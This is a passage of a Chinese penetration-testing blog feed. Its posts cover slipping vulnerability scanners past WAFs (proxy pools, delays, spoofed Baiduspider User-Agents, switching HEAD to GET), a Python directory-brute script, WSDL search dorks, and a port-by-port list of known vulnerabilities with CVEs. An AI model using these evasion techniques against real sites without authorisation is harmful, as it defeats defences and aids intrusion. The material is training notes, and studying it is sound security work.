        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B9%8B%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8C%87%E7%BA%B9%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0.png" alt="WAF绕过-漏洞发现"></p><h2 id="0x01-漏洞发现触发WAF点-针对xray-awvs等"><a href="#0x01-漏洞发现触发WAF点-针对xray-awvs等" class="headerlink" title="0x01 漏洞发现触发WAF点-针对xray,awvs等"></a>0x01 漏洞发现触发WAF点-针对xray,awvs等</h2><p>1、扫描速度-(代理池，延迟，白名单等)：速度过快肯定会被拦截</p><p>2、工具指纹-(特征修改，伪造模拟真实用户等)</p><p>3、漏洞Payload-(数据变异，数据加密，白名单等)</p><p>（热门的扫描工具（awvs，xray等）一般会被WAF拦截，针对单点的漏洞发现工具一般不会被拦截）</p><h2 id="0x02-代理池Proxy-pool项目搭建及使用"><a href="#0x02-代理池Proxy-pool项目搭建及使用" class="headerlink" title="0x02 代理池Proxy_pool项目搭建及使用"></a>0x02 代理池Proxy_pool项目搭建及使用</h2><p>使用方法：</p><p>启用Redis数据库：“此电脑”右键“管理”“服务和应用程序”“Redis”右键“启用”</p><p>setting.py，在“HOST”处填写本地地址</p><p>setting.py，在“DB_CONN”处以“’redis:&#x2F;&#x2F;:password@ip:port&#x2F;db’”的格式填写Redis数据库的账号密码还有IP端口</p><p>运行“proxyPool.py”，加参数“schedule”启动调度程序，加参数“server”启动api服务</p><p>程序会将收集到的可用的代理写到数据库中。</p><p>代理池项目地址：</p><p><a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></p><h2 id="0x03-Aliyun-os-awvs漏扫注入测试绕过-延时白名单"><a href="#0x03-Aliyun-os-awvs漏扫注入测试绕过-延时白名单" class="headerlink" title="0x03 Aliyun_os-awvs漏扫注入测试绕过-延时白名单"></a>0x03 Aliyun_os-awvs漏扫注入测试绕过-延时白名单</h2><p><strong>对阿里云和宝塔的绕过基本采用延迟。</strong></p><p>awvs可以改变数据包内容，因此可以绕过工具指纹和漏洞payload检测，但xray没有相关功能所以没法绕过</p><p>不同工具的判定方式不一样，一个工具被拦截可以换个工具试试</p><p>新开发或冷门的扫描工具可能未被WAF收集，因此可以绕过工具指纹和漏洞payload检测</p><p>如果工具没法控制发送速度，可以用burpsuite做漏扫工具的代理，使用鼠标点击器定速放出数据包。</p><h2 id="0x04-BT-awvs-xray漏扫Payload绕过-延时被动"><a href="#0x04-BT-awvs-xray漏扫Payload绕过-延时被动" class="headerlink" title="0x04 BT-awvs+xray漏扫Payload绕过-延时被动"></a>0x04 BT-awvs+xray漏扫Payload绕过-延时被动</h2><p>xray扫描不会被宝塔拦截，可能是因为宝塔暂未收录xray的信息</p><p>awvs联动xray扫描：</p><p>正常设置awvs，然后设置代理，代理可以直接设置为xray，也可以设置为burpsuite来看数据包发包情况，然后再转发到xray（被动扫描）。地址为“127.0.0.1”，端口自己设置。</p><p>如果使用burpsuite，设置代理，从参照被动扫描部分</p><p>打开xray，被动扫描，输入命令“.\xray的程序名 webscan –listen 地址:端口”，地址端口与被动扫描的一致。</p><p>启动xray，然后启动awvs，开始扫描</p><p>（绕过安全狗同理）</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bypass WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WAF绕过-信息搜集反爬虫延时代理池技术</title>
      <link href="/2022/06/09/WAF%E7%BB%95%E8%BF%87-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%8F%8D%E7%88%AC%E8%99%AB%E5%BB%B6%E6%97%B6%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8A%80%E6%9C%AF/"/>
      <url>/2022/06/09/WAF%E7%BB%95%E8%BF%87-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%8F%8D%E7%88%AC%E8%99%AB%E5%BB%B6%E6%97%B6%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：</p><p><img src="/2022/06/09/WAF%E7%BB%95%E8%BF%87-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%8F%8D%E7%88%AC%E8%99%AB%E5%BB%B6%E6%97%B6%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8A%80%E6%9C%AF/WAF%E7%BB%95%E8%BF%87-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt="WAF绕过-信息搜集"></p><h2 id="0x01-绕过手法"><a href="#0x01-绕过手法" class="headerlink" title="0x01 绕过手法"></a>0x01 绕过手法</h2><p>1、请求方法：改变数据包的请求方法，如从Head改为更常见的Get</p><p>2、模拟用户：修改整个数据包，使它更像一般用户发送的数据</p><p>3、延时：两次访问间设置合适的时间间隔，以防触发拦截机制</p><p>4、代理池：使用代理访问，避开对单个IP的限制</p><p>5、爬虫引擎：为数据包添加搜索引擎的User-Agent，来模仿搜索引擎的爬虫</p><p>6、白名单机制：白名单不受任何拦截机制限制</p><h2 id="0x02-Safedog-默认拦截机制分析绕过-未开CC"><a href="#0x02-Safedog-默认拦截机制分析绕过-未开CC" class="headerlink" title="0x02 Safedog-默认拦截机制分析绕过-未开CC"></a>0x02 Safedog-默认拦截机制分析绕过-未开CC</h2><p>使用WebPathBrute扫描目录，所有地址的状态码都是200，与事实不符</p><p>将HTTP方法从“Head”改为“Get”即可绕过，Head方法快但会被拦截。</p><h2 id="0x03-Safedog-默认拦截机制分析绕过-开启CC"><a href="#0x03-Safedog-默认拦截机制分析绕过-开启CC" class="headerlink" title="0x03 Safedog-默认拦截机制分析绕过-开启CC"></a>0x03 Safedog-默认拦截机制分析绕过-开启CC</h2><p>CC攻击防护会设置单IP访问上限和代理访问上限，请求过于频繁会被拦截使用延迟扫描，设置合适的访问间隔用一般用户的数据包加搜索引擎的User-Agent，来模仿搜索引擎的爬虫使用代理访问，代理访问上限主要防备CC攻击，不一定会阻止目录扫描 。</p><p>修改数据包UA实现爬虫引擎：例：</p><pre class="line-numbers language-none"><code class="language-none">Mozilla&#x2F;5.0 (compatible; Baiduspider-render&#x2F;2.0; +http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>各大搜索引擎的User-Agent：</p><p><a href="https://www.cnblogs.com/iack/p/3557371.html">https://www.cnblogs.com/iack/p/3557371.html</a> </p><h2 id="0x04-Aliyun-os-默认拦截机制分析绕过"><a href="#0x04-Aliyun-os-默认拦截机制分析绕过" class="headerlink" title="0x04 Aliyun_os-默认拦截机制分析绕过"></a>0x04 Aliyun_os-默认拦截机制分析绕过</h2><p>无法修改，触发就会被封禁，只能通过延时或代理池绕过，无法通过爬虫引擎绕过。</p><p>##0x05 BT(防火墙插件)-默认拦截机制分析绕过</p><p>有CC攻击防护，还数据包内容过滤，可以通过延时或代理池绕过，绕过对特定关键词的检查，进一步使用延时或代理池，或对关键词变形。</p><h2 id="0x06-Python脚本搜索引擎爬虫模拟"><a href="#0x06-Python脚本搜索引擎爬虫模拟" class="headerlink" title="0x06 Python脚本搜索引擎爬虫模拟"></a>0x06 Python脚本搜索引擎爬虫模拟</h2><p>import requests</p><p>import time</p><p>headers&#x3D;{</p><p>‘Connection’: ‘keep-alive’,</p><p>‘Cache-Control’: ‘max-age&#x3D;0’,</p><p>‘Upgrade-Insecure-Requests’: ‘1’,</p><p>模拟用户 Kit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36</p><p>模拟引擎 Mozilla&#x2F;5.0 (compatible; Baiduspider-render&#x2F;2.0; +<a href="http://www.baidu.com/search/spider.html">http://www.baidu.com/search/spider.html</a>)</p><p>‘User-Agent’: </p><p>‘Mozilla&#x2F;5.0 </p><p>(compatible; </p><p>Baiduspider-render&#x2F;2.0;+<a href="http://www.baidu.com/search/spider.html">http://www.baidu.com/search/spider.html</a>)’,</p><p>‘Sec-Fetch-Dest’: ‘document’,</p><p>‘Accept’:’text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9’,</p><p>‘Sec-Fetch-Site’: ‘none’,</p><p>‘Sec-Fetch-Mode’: ‘navigate’,</p><p>‘Sec-Fetch-User’: ‘?1’,</p><p>‘Accept-Encoding’: ‘gzip, deflate, br’,</p><p>‘Accept-Language’: ‘zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7’,</p><p>‘Cookie’: ‘xxx’,#根据当前访问 cookie</p><p>}</p><p>for paths in open(‘php_b.txt’,encoding&#x3D;’utf-8’):</p><p>url&#x3D;’<a href="http://192.168.0.103:8081/">http://192.168.0.103:8081/</a>‘</p><p>paths&#x3D;paths.replace(‘\n’,’’)</p><p>urls&#x3D;url+paths</p><p>如需测试加代理，或加入代理池需加代理</p><p>proxy &#x3D; {</p><p>‘http’: ‘127.0.0.1:7777’}</p><p>try:</p><p>code&#x3D;requests.get(urls,headers&#x3D;headers,verify&#x3D;False).status_code</p><p>print(urls+’|’+str(code))</p><p>if code&#x3D;&#x3D;200 or code&#x3D;&#x3D;403:</p><p>print(urls+’|’+str(code))</p><p>except Exception as err:</p><p>print(‘connecting error’)</p><p>time.sleep(3)  模拟用户需延时 引擎可用可不用（根据请求速度）</p><h2 id="0x07-代理池"><a href="#0x07-代理池" class="headerlink" title="0x07 代理池"></a>0x07 代理池</h2><p>使用代理池绕过WAF单个IP拦截，如下图：</p><p><img src="/2022/06/09/WAF%E7%BB%95%E8%BF%87-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%8F%8D%E7%88%AC%E8%99%AB%E5%BB%B6%E6%97%B6%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8A%80%E6%9C%AF/image-20220609174330424.png" alt="image-20220609174330424"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bypass WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞发现-API接口服务类</title>
      <link href="/2022/06/08/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-API%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E7%B1%BB/"/>
      <url>/2022/06/08/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-API%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/08/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-API%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E7%B1%BB/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-API%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1.png" alt="漏洞发现-API接口服务"></p><h2 id="0x01-端口服务类安全测试"><a href="#0x01-端口服务类安全测试" class="headerlink" title="0x01 端口服务类安全测试"></a>0x01 端口服务类安全测试</h2><p>根据前期信息收集针对目标端口服务类探针后进行的安全测试；主要涉及攻击方法：口令安全，WEB类漏洞，版本漏洞等，其中产生的危害可大可小。属于端口服务&#x2F;第三方服务类安全测试面。一般在已知应用无思路的情况下选用的安全测试方案。</p><h2 id="0x02-API-接口-WebServiceRESTful-API"><a href="#0x02-API-接口-WebServiceRESTful-API" class="headerlink" title="0x02 API 接口-WebServiceRESTful API"></a>0x02 API 接口-WebServiceRESTful API</h2><p>###0x00 API介绍</p><p>根据应用自身的功能方向决定，安全测试目标需有 API 接口调用才能进行此类测试，主要涉及的安全问题：自身安全，配合 WEB，业务逻辑等，其中产生的危害可大可小，属于应用 API 接口网络服务测试面，一般也是在存在接口调用的情况下的测试方案。</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/2412">https://xz.aliyun.com/t/2412</a></p><h3 id="0x01-WSDL"><a href="#0x01-WSDL" class="headerlink" title="0x01 WSDL"></a>0x01 WSDL</h3><p>WSDL（网络服务描述语言，Web Services Description Language）是一门基于XML的语言，用于描述Web Services以及如何对它们进行访问。 </p><h3 id="0x02-判断是否有API接口"><a href="#0x02-判断是否有API接口" class="headerlink" title="0x02 判断是否有API接口"></a>0x02 判断是否有API接口</h3><p>1、从功能点判断</p><p>2、有无特定的漏洞关键字 </p><h3 id="0x03-漏洞关键字"><a href="#0x03-漏洞关键字" class="headerlink" title="0x03 漏洞关键字"></a>0x03 漏洞关键字</h3><p>配合 shodan，fofa，zoomeye</p><p>inurl:jws?wsdl</p><p>inurl:asmx?wsdl</p><p>inurl:aspx?wsdl</p><p>inurl:ascx?wsdl</p><p>inurl:ashx?wsdl</p><p>inurl:dll?wsdl</p><p>inurl:exe?wsdl</p><p>inurl:php?wsdl</p><p>inurl:pl?wsdl</p><p>inurl:?wsdl</p><p>filetype:wsdl wsdl </p><p><strong>（其实就是谷歌黑客语法，有专门的书籍）</strong></p><h2 id="0x03-端口常见漏洞"><a href="#0x03-端口常见漏洞" class="headerlink" title="0x03 端口常见漏洞"></a>0x03 端口常见漏洞</h2><h3 id="0x00-Web服务类"><a href="#0x00-Web服务类" class="headerlink" title="0x00 Web服务类"></a>0x00 Web服务类</h3><p>1、Tomcat –80&#x2F;8080&#x2F;8000</p><blockquote><p>manager弱口令</p><p>put上传webshell</p><p>HTTP慢速攻击</p><p>ajr文件包含漏洞–CVE-2020-1938</p></blockquote><p>2、Jboss –8080</p><blockquote><p>后台弱口令</p><p>console后台部署war包</p><p>JAVA反序列化</p><p>远程代码执行</p></blockquote><p>3、WebSphere –9080</p><blockquote><p>后台弱口令</p><p>任意文件泄漏</p><p>JAVA反序列化</p></blockquote><p>4、Weblogic –7001&#x2F;7002</p><blockquote><p>后台弱口令</p><p>console后台部署war包</p><p>SSRF</p><p>测试页面上传webshell</p><p>JAVA反序列化–CVE-2018-2628、CVE-2018-2893、CVE-2017-10271、CVE-2019-2725、CVE-2019-2729</p></blockquote><p>5、Glassfish –8080&#x2F;4848</p><blockquote><p>暴力破解</p><p>任意文件读取</p><p>认证绕过</p></blockquote><p>6、Jetty –8080</p><blockquote><p>远程共享缓冲区溢出</p></blockquote><p>7、Apache –80&#x2F;8080</p><blockquote><p>HTTP慢速攻击</p><p>解析漏洞</p><p>目录遍历</p></blockquote><p>8、Apache Solr –8983</p><blockquote><p>远程命令执行–CVE-2017-12629、CVE-2019-0193</p></blockquote><p>9、IIS –80</p><blockquote><p>put上传webshell</p><p>IIS解析漏洞</p><p>IIS提权</p><p>IIS远程代码执行–CVE-2017-7269</p></blockquote><p>10、Resin –8080</p><blockquote><p>目录遍历</p><p>远程文件读取</p></blockquote><p>11、AXIS2 –8080</p><blockquote><p>后台弱口令</p></blockquote><p>12、Lutos –1352</p><blockquote><p>后台弱口令</p><p>信息泄漏</p><p>跨站脚本攻击</p></blockquote><p>13、Nginx –80&#x2F;443</p><blockquote><p>HTTP慢速攻击</p><p>解析漏洞</p></blockquote><p>###0x01 数据库类</p><p>1、MySQL –3306</p><blockquote><p>弱口令</p><p>身份认证漏洞–CVE-2012-2122</p><p>拒绝服务攻击</p><p>phpmyadmin万能密码&#x2F;弱口令</p><p>UDF&#x2F;MOF提权</p></blockquote><p>2、MsSQL –1433</p><blockquote><p>弱口令</p><p>存储过程提取</p></blockquote><p>3、Oracle –1521</p><blockquote><p>弱口令</p><p>未经授权访问</p></blockquote><p>4、Reids –6379</p><blockquote><p>弱口令</p><p>未经授权访问</p></blockquote><p>5、PostgreSQL –5432</p><blockquote><p>弱口令</p><p>缓冲区溢出–CVE-2014-2669</p></blockquote><p>6、MongoDB –27001</p><blockquote><p>弱口令</p><p>未经授权访问</p></blockquote><p>7、DB2 –5000</p><blockquote><p>安全限制绕过进行未经授权操作–CVE-2015-1922</p></blockquote><p>8、SysBase –5000&#x2F;4100</p><blockquote><p>弱口令</p><p>命令注入</p></blockquote><p>9、Memcache –11211</p><blockquote><p>未经授权访问</p><p>配置漏洞</p></blockquote><p>10、ElasticSearch –9200&#x2F;9300</p><blockquote><p>未经授权访问</p><p>远程代码执行</p><p>文件办理</p><p>写入webshell </p></blockquote><h3 id="0x02-大数据类"><a href="#0x02-大数据类" class="headerlink" title="0x02 大数据类"></a>0x02 大数据类</h3><p>1、Hadoop –50010</p><blockquote><p>远程命令执行</p></blockquote><p>2、Zookeeper –2181</p><blockquote><p>未经授权访问</p></blockquote><h3 id="0x03-文件共享"><a href="#0x03-文件共享" class="headerlink" title="0x03 文件共享"></a>0x03 文件共享</h3><p>1、FTP –21</p><blockquote><p>弱口令</p><p>匿名访问</p><p>上传后门</p><p>远程溢出</p><p>跳转攻击</p></blockquote><p>2、NFS –2049</p><blockquote><p>未经授权访问</p></blockquote><p>3、Samba –137</p><blockquote><p>弱口令</p><p>未经授权访问</p><p>远程代码执行–CVE-2015-0240</p></blockquote><p>4、LDAP –389</p><blockquote><p>弱口令</p><p>注入</p><p>未经授权访问</p></blockquote><h3 id="0x04-远程访问"><a href="#0x04-远程访问" class="headerlink" title="0x04 远程访问"></a>0x04 远程访问</h3><p>1、SSH –22</p><blockquote><p>弱口令</p><p>28退格漏洞</p><p>OpenSSL漏洞</p><p>用户名枚举</p></blockquote><p>2、Telent –23</p><blockquote><p>弱口令</p></blockquote><p>3、RDP –3389</p><blockquote><p>弱口令</p><p>Shitf粘滞键后门</p><p>缓冲区溢出</p><p>MS12-020</p><p>CVE-2019-0708</p></blockquote><p>4、VNC –5901</p><blockquote><p>弱口令</p><p>认证口令绕过</p><p>拒绝服务攻击–CVE-2015-5239</p><p>权限提升–CVE-2013-6886</p></blockquote><p>5、Pcanywhere –5632</p><blockquote><p>拒绝服务攻击</p><p>权限提升</p><p>代码执行</p></blockquote><p>6、X11 –6000</p><blockquote><p>未授权访问–CVE-1999-0526 </p></blockquote><h3 id="0x05-邮件服务"><a href="#0x05-邮件服务" class="headerlink" title="0x05 邮件服务"></a>0x05 邮件服务</h3><p>1、SMTP –25&#x2F;465</p><blockquote><p>弱口令</p><p>未经授权访问</p><p>邮件伪造</p></blockquote><p>2、POP3 –110&#x2F;995</p><blockquote><p>弱口令</p><p>未经授权访问</p></blockquote><p>3、IMAP –143&#x2F;993</p><blockquote><p>弱口令</p><p>任意文件读取</p></blockquote><h3 id="0x06-其他服务"><a href="#0x06-其他服务" class="headerlink" title="0x06 其他服务"></a>0x06 其他服务</h3><p>1、DNS –53</p><blockquote><p>DNS区域传输</p><p>DNS劫持</p><p>DNS欺骗</p><p>DNS缓存投毒</p><p>DNS隧道</p></blockquote><p>2、DHCP –67&#x2F;68</p><blockquote><p>DHCP劫持</p><p>DHCP欺骗</p></blockquote><p>3、SNMP –161</p><blockquote><p>弱口令</p></blockquote><p>4、Rlogin –512&#x2F;513&#x2F;514</p><blockquote><p>rlogin登录</p></blockquote><p>5、Rsync –873</p><blockquote><p>未经授权访问</p><p>本地权限提升</p></blockquote><p>6、Zabbix –8069</p><blockquote><p>远程代码执行</p></blockquote><p>7、RMI –1090&#x2F;1099</p><blockquote><p>JAVA反序列化</p></blockquote><p>8、Docker –2375</p><blockquote><p>未经授权访问</p></blockquote><h2 id="0x04-思路"><a href="#0x04-思路" class="headerlink" title="0x04 思路"></a>0x04 思路</h2><p>1、扫域名，扫ip，扫端口，能扫就扫；</p><p>2、信息搜集才是渗透测试的核心。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞发现-APP应用类</title>
      <link href="/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-APP%E5%BA%94%E7%94%A8%E7%B1%BB/"/>
      <url>/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-APP%E5%BA%94%E7%94%A8%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-APP%E5%BA%94%E7%94%A8%E7%B1%BB/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-APP%E5%BA%94%E7%94%A8.png" alt="漏洞发现-APP应用"></p><h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>反编译提取 URL 或抓包获取 URL，进行 WEB 应用测试，如不存在或走其他协议的情况下，需采用网络接口抓包进行数据获取，转至其他协议安全测试。</p><h2 id="0x02-工具"><a href="#0x02-工具" class="headerlink" title="0x02 工具"></a>0x02 工具</h2><p>1、Burpsuite</p><p>2、Charlesproxy</p><p>3、apk一键提取</p><h2 id="0x03-案例"><a href="#0x03-案例" class="headerlink" title="0x03 案例"></a>0x03 案例</h2><p>大概思路：</p><p>1、利用Burpsuite或者其他代理工具进行抓包提取URL，使用BP时注意配置好https进行抓包，否则抓不到APP数据包，APP数据包大多采用https；可以利用BP的筛选模块，将获取到的URL进行参数的筛选，之后进行测试；</p><p>2、若涉及到其他协议（非WEB协议）使用wireshark进行分析；</p><p>3、也可使用apk一键提取，直接导出相关URL进行分析；</p><p>4、使用Burp筛选联动其他漏洞扫描工具打出组合拳，例如联动Xray或者AWVS等，使漏洞最大化。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>当把APP抓包提取URL后，其实就是一个Web网站，之后就可以利用Web渗透的思路去测试。</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>由于没有找到违法且合适测试的APP，大概就讲一下APP渗透的思路吧。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞发现-Web应用类</title>
      <link href="/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E5%BA%94%E7%94%A8%E7%B1%BB/"/>
      <url>/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E5%BA%94%E7%94%A8%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：</p><p><img src="/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E5%BA%94%E7%94%A8%E7%B1%BB/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E5%BA%94%E7%94%A8.png" alt="漏洞发现-Web应用"></p><h2 id="0x01-已知CMS"><a href="#0x01-已知CMS" class="headerlink" title="0x01 已知CMS"></a>0x01 已知CMS</h2><p>例如常见的 dedecms.discuz,wordpress 等源码结构，这种一般采用非框架类开发，但也有少部分采用的是框架类开发，针对此类源码程序的安全检测，我们要利用公开的漏洞进行测试，如不存在可采用白盒代码审计自行挖掘。</p><p>已知CMS可以利用漏洞平台搜索关键字搜索相关程序的漏洞。</p><h2 id="0x02-开发框架"><a href="#0x02-开发框架" class="headerlink" title="0x02 开发框架"></a>0x02 开发框架</h2><p>例如常见的 thinkphp，spring,flask 等开发的源码程序，这种源码程序正常的安全测试思路：先获取对应的开发框架信息(名字，版本)，通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审计自行挖掘。</p><p>可利用漏洞框架进行针对性扫描攻击，例如cmsscan，wpscan，TPscan等等针对某一种框架进行漏洞挖掘。</p><h2 id="0x03-未知CMS"><a href="#0x03-未知CMS" class="headerlink" title="0x03 未知CMS"></a>0x03 未知CMS</h2><p>如常见的企业或个人内部程序源码，也可以是某 CMS 二次开发的源码结构；</p><p>针对此类的源码程序测试思路：能识别二次开发就按已知 CMS 思路进行，不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜），同样在有源码的情况下也可以进行代码审计自行挖掘。</p><p>可以利用xray，awvs，appscan等工具进行漏扫；</p><p>或者人工探测应用功能，URL参数，盲猜测试等进行漏洞挖掘。</p><h2 id="0x04-案例"><a href="#0x04-案例" class="headerlink" title="0x04 案例"></a>0x04 案例</h2><p>利用seebug可以搜索thikphp，可以看到会有相关漏洞，点击Thinkphp 5.0.x 远程代码执行漏洞还有相关补丁PoC等等</p><p><img src="/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E5%BA%94%E7%94%A8%E7%B1%BB/image-20220607182347641.png" alt="image-20220607182347641"></p><p><img src="/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E5%BA%94%E7%94%A8%E7%B1%BB/image-20220607182628352.png" alt="image-20220607182628352"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞发现-操作系统类漏洞</title>
      <link href="/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%B1%BB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%B1%BB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图</p><p><img src="/2022/06/07/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%B1%BB%E6%BC%8F%E6%B4%9E/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.png" alt="漏洞发现-操作系统"></p><h2 id="0x01-漏洞探针"><a href="#0x01-漏洞探针" class="headerlink" title="0x01 漏洞探针"></a>0x01 漏洞探针</h2><p>系统漏洞由于手工检测操作系统漏洞很复杂很麻烦，由此利用漏洞探针工具检测漏洞。</p><p>漏扫工具：<br>Goby,Nmap,Nessus</p><p>Nmap的一些第三方漏洞库：</p><p>Nmap –script&#x3D;vuln 默认 nse 插件扫描</p><p>Nmap vulscan vulners 调用第三方库探针</p><p>参考文章：<br><a href="https://www.cnblogs.com/shwang/p/12623669.html">https://www.cnblogs.com/shwang/p/12623669.html</a></p><h2 id="0x02-漏洞类型"><a href="#0x02-漏洞类型" class="headerlink" title="0x02 漏洞类型"></a>0x02 漏洞类型</h2><p>1、远程执行</p><p>2、权限提升</p><p>3、缓冲区溢出</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>1、漏洞利用框架：</p><p>Metasploit、Searchsploit</p><p>利用Searchsploit搜索漏洞，之后利用。</p><p>漏洞库网站：<br><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><p><a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn</a></p><p><a href="https://www.seebug.org/">https://www.seebug.org</a></p><p>2、单点EXP</p><p>针对某个漏洞的脚本等等</p><p>3、复现文章</p><p>看各种文章。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE本地靶场</title>
